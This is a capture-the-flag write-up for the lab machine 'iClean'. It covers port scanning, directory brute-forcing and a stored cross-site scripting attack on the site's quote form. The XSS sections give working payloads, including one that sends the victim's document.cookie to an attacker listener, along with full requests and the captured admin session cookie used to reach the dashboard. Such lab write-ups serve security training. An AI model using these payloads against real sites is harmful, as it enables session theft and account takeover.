# iClean

## Recon
```shell
rustscan -b 1000 -u 5000 -r 0-65535 -a 10.10.11.12
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.12:22
Open 10.10.11.12:80
[~] Starting Script(s)
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-07 10:41 IST
Initiating Ping Scan at 10:41
Scanning 10.10.11.12 [2 ports]
Completed Ping Scan at 10:41, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:41
Completed Parallel DNS resolution of 1 host. at 10:41, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:41
Scanning 10.10.11.12 [2 ports]
Discovered open port 22/tcp on 10.10.11.12
Discovered open port 80/tcp on 10.10.11.12
Completed Connect Scan at 10:41, 0.09s elapsed (2 total ports)
Nmap scan report for 10.10.11.12
Host is up, received conn-refused (0.089s latency).
Scanned at 2024-08-07 10:41:57 IST for 0s
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

```shell
rustscan -p 22,80 -u 5000 -a 10.10.11.12 -- -O -sC -sV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.12:22
Open 10.10.11.12:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -O -sC -sV" on ip 10.10.11.12
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-07 10:45 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
Initiating Ping Scan at 10:45
Scanning 10.10.11.12 [4 ports]
Completed Ping Scan at 10:45, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:45
Completed Parallel DNS resolution of 1 host. at 10:45, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 10:45
Scanning 10.10.11.12 [2 ports]
Discovered open port 80/tcp on 10.10.11.12
Discovered open port 22/tcp on 10.10.11.12
Completed SYN Stealth Scan at 10:45, 0.11s elapsed (2 total ports)
Initiating Service scan at 10:45
Scanning 2 services on 10.10.11.12
Completed Service scan at 10:45, 6.20s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.12
Retrying OS detection (try #2) against 10.10.11.12
NSE: Script scanning 10.10.11.12.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:46, 2.55s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.37s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Nmap scan report for 10.10.11.12
Host is up, received reset ttl 62 (0.067s latency).
Scanned at 2024-08-07 10:45:47 IST for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.8 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Linux 5.0 - 5.5 (92%), Linux 3.1 (91%), Linux 3.2 (91%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (91%), Linux 5.0 - 5.4 (90%), Linux 5.4 (90%), Adtran 424RG FTTH gateway (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=8/7%OT=22%CT=%CU=42584%PV=Y%DS=3%DC=I%G=N%TM=66B30311%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=109%TI=Z%CI=Z)
SEQ(SP=100%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M577ST11NW7%O2=M577ST11NW7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11NW7%O6=M577ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M577NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=CF77%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.000 days (since Wed Aug  7 10:45:55 2024)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.37 seconds
           Raw packets sent: 102 (8.282KB) | Rcvd: 40 (3.244KB)
```

## HTTP 80
- http://capiclean.htb
```http
HTTP/1.1 200 OK
Date: Wed, 07 Aug 2024 06:03:22 GMT
Server: Werkzeug/2.3.7 Python/3.10.12
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 3431
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
```
![image](https://github.com/user-attachments/assets/8ae7d66c-fa7a-4205-925c-da43ba8c21e8)

- http://capiclean.htb/quote
![image](https://github.com/user-attachments/assets/fbc29c20-8a65-4e9c-92e9-dedcbe0a0d67)
![image](https://github.com/user-attachments/assets/feb1d62e-d4d1-46cd-8adb-bb7291e875d9)
![image](https://github.com/user-attachments/assets/5f02546b-d144-4557-833f-00d64f1dfef3)

-http://capiclean.htb/login
![image](https://github.com/user-attachments/assets/142ddacb-2288-49bb-9f7b-04653b460c1a)

## Content Discovery
```
feroxbuster -u http://capiclean.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://capiclean.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!                                                                                                                                     
 💥  Timeout (secs)        │ 7                                                                                                                                                     
 🦡  User-Agent            │ feroxbuster/2.10.4                                                                                                                                    
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                                                    
 🔎  Extract Links         │ true                                                                                                                                                  
 🏁  HTTP methods          │ [GET]                                                                                                                                                 
 🔃  Recursion Depth       │ 4                                                                                                                                                     
───────────────────────────┴──────────────────────                                                                                                                                 
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                                                
──────────────────────────────────────────────────                                                                                                                                 
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                            
200      GET      213l     1380w    11324c http://capiclean.htb/static/js/jquery-3.0.0.min.js                                                                                      
200      GET      369l     1201w     9644c http://capiclean.htb/static/js/custom.js                                                                                                
200      GET        5l       52w     2215c http://capiclean.htb/static/images/linkden-icon.png                                                                                     
200      GET        5l       46w     1384c http://capiclean.htb/static/images/search-icon.png                                                                                      
200      GET      446l     1347w    11748c http://capiclean.htb/static/css/responsive.css                                                                                          
200      GET        3l       50w     1779c http://capiclean.htb/static/images/map-icon.png                                                                                         
200      GET       15l      110w     7039c http://capiclean.htb/static/images/logo.png                                                                                             
200      GET        5l       57w     2262c http://capiclean.htb/static/images/instagram-icon.png                                                                                   
200      GET        4l       53w     1995c http://capiclean.htb/static/images/fb-icon.png                                                                                          
200      GET       90l      181w     2237c http://capiclean.htb/quote                                                                                                              
200      GET      154l      399w     6084c http://capiclean.htb/choose                                                                                                             
200      GET        3l       17w     1061c http://capiclean.htb/static/images/favicon.png                                                                                          
200      GET        4l       53w     2119c http://capiclean.htb/static/images/twitter-icon.png                                                 
200      GET        3l       56w     2181c http://capiclean.htb/static/images/icon-1.png                                                       
200      GET       88l      159w     2106c http://capiclean.htb/login                                                                          
200      GET      130l      355w     5267c http://capiclean.htb/about                                                                          
200      GET        6l       44w     1013c http://capiclean.htb/static/css/owl.theme.default.min.css                                           
200      GET        6l       73w     3248c http://capiclean.htb/static/css/owl.carousel.min.css                                                
200      GET        8l       63w     2400c http://capiclean.htb/static/images/call-icon.png                                                    
200      GET        3l       39w     1008c http://capiclean.htb/static/images/toggle-icon.png                                                  
200      GET        8l       53w     2064c http://capiclean.htb/static/images/icon-2.png                                                       
200      GET        6l      352w    19190c http://capiclean.htb/static/js/popper.min.js                                                        
200      GET      193l      579w     8592c http://capiclean.htb/services                                                                       
200      GET      183l      564w     8109c http://capiclean.htb/team                                                                           
200      GET      872l     1593w    16549c http://capiclean.htb/static/css/style.css                      
200      GET      162l      931w    80352c http://capiclean.htb/static/images/img-4.png             
200      GET      180l     1125w    84070c http://capiclean.htb/static/images/img-6.png         
200      GET      167l      997w    83329c http://capiclean.htb/static/images/img-7.png                        
200      GET        1l      870w    42839c http://capiclean.htb/static/css/jquery.mCustomScrollbar.min.css
200      GET        7l      896w    70808c http://capiclean.htb/static/js/bootstrap.bundle.min.js              
200      GET        1l      153w    22994c http://capiclean.htb/static/js/jquery.fancybox.min.js                                               
302      GET        5l       22w      189c http://capiclean.htb/dashboard => http://capiclean.htb/
200      GET      229l     1282w    93801c http://capiclean.htb/static/images/img-5.png                                                        
200      GET        5l      478w    45479c http://capiclean.htb/static/js/jquery.mCustomScrollbar.concat.min.js                                
200      GET      332l     1920w   144448c http://capiclean.htb/static/images/img-2.png                                                        
200      GET        5l     1287w    87088c http://capiclean.htb/static/js/jquery.min.js                                                        
302      GET        5l       22w      189c http://capiclean.htb/logout => http://capiclean.htb/                                                
200      GET     3448l    10094w    89992c http://capiclean.htb/static/js/owl.carousel.js                                                      
200      GET        7l     1604w   140421c http://capiclean.htb/static/css/bootstrap.min.css                                                   
405      GET        5l       20w      153c http://capiclean.htb/sendMessage                                                                    
403      GET        9l       28w      278c http://capiclean.htb/server-status                                                                  
200      GET      605l     3945w   299706c http://capiclean.htb/static/images/img-3.png
200      GET        0l        0w   918708c http://capiclean.htb/static/js/plugin.js                                                           
200      GET        0l        0w   155871c http://capiclean.htb/static/images/img-1.png
200      GET      349l     1208w    16697c http://capiclean.htb/
[####################] - 12s     4773/4773    0s      found:45      errors:4      
[####################] - 12s     4724/4724    396/s   http://capiclean.htb/                                                                    
```
![image](https://github.com/user-attachments/assets/841e5497-b81d-45e0-be99-b514ee84d582)

## Cross Site Scripting
- Test payload
```shell
<img src="http://10.10.14.33:8000/invalid" onerror=this.src="http://10.10.14.33:8000/">
```

Request:
```shell
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 130
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://capiclean.htb/quote
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

service=<img+src%3d"http%3a//10.10.14.33%3a8000/invalid"+onerror%3dthis.src%3d"http%3a//10.10.14.33%3a8000/">&email=pwn%40root.com
```
![image](https://github.com/user-attachments/assets/7e8f28dc-78e2-4bc1-883e-f0046b8ba17b)


Response:
```shell
> rlwrap nc -nlvvkp 8000
listening on [any] 8000 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.12] 41222
GET /invalid HTTP/1.1
Host: 10.10.14.33:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

 sent 0, rcvd 360

```
![image](https://github.com/user-attachments/assets/9c5483ab-ba9a-4ce6-9c38-d601838f9d6c)

## Cookie Stealing
Payload:
```
<img src=null onerror=this.src="http://10.10.14.33:8000/?cookie="+document.cookie;>
```

Request:
```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 130
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://capiclean.htb/quote
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

service=<img+src%3dnull+onerror%3dthis.src%3d"http%3a//10.10.14.33%3a8000/%3fcookie%3d"%2bdocument.cookie%3b>&email=pwn%40root.com
```
![image](https://github.com/user-attachments/assets/b8d1d4cc-43af-4a68-bbbd-864ecf7d8618)

Response:
```
> rlwrap nc -nlvvkp 8000
listening on [any] 8000 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.12] 36714
GET /?cookie=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZrPQoQ.5gAlhyN1avk5kwsjPdMzY1Fqb_0 HTTP/1.1
Host: 10.10.14.33:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

 sent 0, rcvd 462
```
![image](https://github.com/user-attachments/assets/16aaf68b-15e7-47c3-a954-592d76c19c81)

Using the cookie access the `/dashboard` endpoint:
![image](https://github.com/user-attachments/assets/ab99051f-ae53-45b1-a571-70252e3d220e)


Generate Invoice:
![image](https://github.com/user-attachments/assets/7dcfa7ef-7892-4e59-baab-92a378eb1f2b)

```
Invoice ID generated: 2186596245
```

![image](https://github.com/user-attachments/assets/313c4a9d-076a-4bcc-b805-6daebffe9bfc)
